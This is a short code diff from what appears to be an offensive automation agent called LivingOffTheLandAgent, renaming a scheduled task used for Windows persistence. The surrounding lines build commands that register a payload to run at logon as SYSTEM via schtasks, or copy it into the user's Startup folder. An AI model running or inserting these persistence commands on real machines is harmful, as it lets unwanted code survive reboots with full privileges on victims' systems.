@@ -209,7 +209,7 @@ class LivingOffTheLandAgent(BaseAgent):
         command = ""
         if target_os.lower() == "windows":
             if technique == "schtasks":
-                command = f"schtasks /create /tn \"dLNkdLNk\" /tr \"{payload_path}\" /sc ONLOGON /ru SYSTEM /f"
+                command = f"schtasks /create /tn \"ConnextConnext\" /tr \"{payload_path}\" /sc ONLOGON /ru SYSTEM /f"
             elif technique == "startup_folder":
                 command = f"copy \"{payload_path}\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
             else:
